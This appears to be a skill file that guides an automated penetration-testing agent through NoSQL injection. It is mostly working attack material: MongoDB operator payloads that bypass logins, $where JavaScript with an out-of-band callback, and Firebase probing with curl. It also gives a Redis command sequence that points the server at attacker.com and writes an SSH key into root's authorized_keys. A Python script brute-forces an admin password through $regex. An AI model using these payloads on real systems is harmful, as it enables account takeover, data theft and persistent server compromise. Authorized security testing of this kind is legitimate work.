# NoSQL Injection — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Testing | **Prerequisite:** Endpoint has been mapped (Phase 2), DB classification = DB_LOOKUP, application uses NoSQL (MongoDB, Redis, Firebase, CouchDB, DynamoDB)

---

## Mental Model

NoSQL databases don't use SQL. They use JSON-like query languages, JavaScript expressions, and REST APIs. Injection here means manipulating query operators ($where, $regex, $ne, $gt) or injecting JavaScript that the database evaluates.

**The key insight:** Many frameworks (Express.js + Mongoose, Meteor, Parse Server) accept JSON body parameters directly as query filters. If the application doesn't sanitize the JSON structure, you can inject MongoDB operators.

**What makes NoSQL injection different from SQLi:**
- No `' OR 1=1 --` syntax — everything is JSON
- $where operator allows arbitrary JavaScript execution
- Blind extraction works via $regex (boolean) or $where+sleep (time-based)
- In Firebase, the URL itself is the query (`.json` endpoints)
- Redis injection is command-based, not query-based

---

## Phase 1: OOB-First Detection (MANDATORY — run BEFORE anything else)

**OOB is the FASTEST and most RELIABLE way to confirm blind NoSQL injection.**

### 1.1 Start OOB server
```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

### 1.2 Inject OOB payloads

#### MongoDB $where + sleep (time-based — use OOB as secondary)
```json
{"$where": "sleep(5000) || true"}
{"$where": "d = new Date(); do { c = new Date(); } while (c - d < 5000)"}
```

#### MongoDB $where + OOB (DNS/HTTP callback)
```json
{"$where": "new Image().src='http://OOB_URL/mongo-oob'"}
```

#### Redis command injection
```
SLAVEOF OOB_URL 6379
CONFIG SET dir /tmp
```

### 1.3 Poll for callbacks
```bash
./tools/interactsh_launcher.sh poll --output-dir engagement/oob/ --timeout 30
```
If callbacks received → CONFIRMED. Skip Phase 2-3, go directly to Phase 4 (exploitation).

---

## Phase 2: Confirmation (Sonic-Based && OOB failed)

### 2.1 Authentication Bypass (MongoDB)

If the endpoint is a login/auth endpoint accepting JSON:

```json
# Test 1: $ne operator (not equals)
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}

# Test 2: $gt operator (greater than — especially for numeric IDs)
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# Test 3: $regex — matches anything
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}

# Test 4: $exists 
{"username": {"$exists": true}, "password": {"$exists": true}}

# Test 5: $in (in array)
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}}
```

**Baseline check:** Compare each response against the valid-baseline and invalid-baseline from the mapping profile. Use `python3 tools/response_diff.py` for automated comparison.

### 2.2 Blind Extraction (MongoDB $regex)

Once you confirm NoSQL injection, extract data character by character:

```json
# Check if password starts with 'a'
{"username": "admin", "password": {"$regex": "^a"}}

# Check if password starts with 'aa'
{"username": "admin", "password": {"$regex": "^aa"}}

# Use $regex for full string extraction — response differs on match vs non-match
```

### 2.3 Firebase / Firestore Injection

Firebase databases often expose `.json` endpoints:

```bash
# Check if database is exposed
curl https://PROJECT-ID.firebaseio.com/.json

# Injection via URL parameter filtering
curl "https://PROJECT-ID.firebaseio.com/users.json?orderBy=%22role%22&equalTo=%22admin%22"

# Auth bypass via shallow query
curl "https://PROJECT-ID.firebaseio.com/.json?auth=CREDS&shallow=true"
```

### 2.4 Redis Command Injection

If the application uses Redis and you can inject into Redis commands:

```
# Connection to external Redis (SSRF-like)
SLAVEOF attacker.com 6379

# Write SSH key
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET key "\n\nssh-rsa AAA...\n\n"
SAVE
```

---

## Phase 3: Negative Verdict (MANDATORY GATE)

**DO NOT declare a finding as NEGATIVE without completing this phase:**

1. Run ALL payloads from ALL test variants (Phase 1 + Phase 2)
2. Verify each payload against BOTH baselines:
   ```bash
   python3 tools/response_diff.py --mode compare \
     --baseline-valid <valid_baseline_file> \
     --baseline-invalid <invalid_baseline_file> \
     --probe <probe_response_file>
   ```
3. If ALL responses match invalid-baseline or error responses → NEGATIVE
4. If ANY response differs from BOTH baselines → re-test that specific payload 3 times
5. If consistent difference across 3 retests → NOT a negative, escalate to MEDIUM confidence

---

## Phase 4: Exploitation (Only after confirmation)

### 4.1 Database Dump via $regex
```python
import requests, string

target = "https://target.com/api/login"
charset = string.ascii_letters + string.digits + "!@#$%^&*()"
extracted = ""

while True:
    for c in charset:
        payload = {"username": "admin", "password": {"$regex": f"^{extracted + c}"}}
        r = requests.post(target, json=payload)
        if "success" in r.text.lower() or r.status_code == 200:
            extracted += c
            print(f"Found: {extracted}")
            break
    else:
        break  # No more matches

print(f"Password: {extracted}")
```

### 4.2 Mass Data Extraction (MongoDB $where)
```json
{"$where": "this.role == 'admin'"}
{"$where": "this.email.match(/@company.com/)"}
```

---

## What You DO
- Test with MongoDB operators ($ne, $gt, $regex, $where, $exists, $in)
- Test Firebase/Redis-specific injection patterns
- Run response_diff.py on every probe vs baseline
- Test OOB first (Phase 1) — it's the fastest reliable confirmation
- Run noise elimination (3 retests) on any potential signal

## What You DO NOT Do
- Run sqlmap — it's SQL-specific, useless for NoSQL
- Use SQL injection syntax (quotes, UNION SELECT) — NoSQL doesn't parse SQL
- Attempt `' OR 1=1 --` style payloads
- Skip $regex blind extraction — it's the most reliable NoSQL extraction method
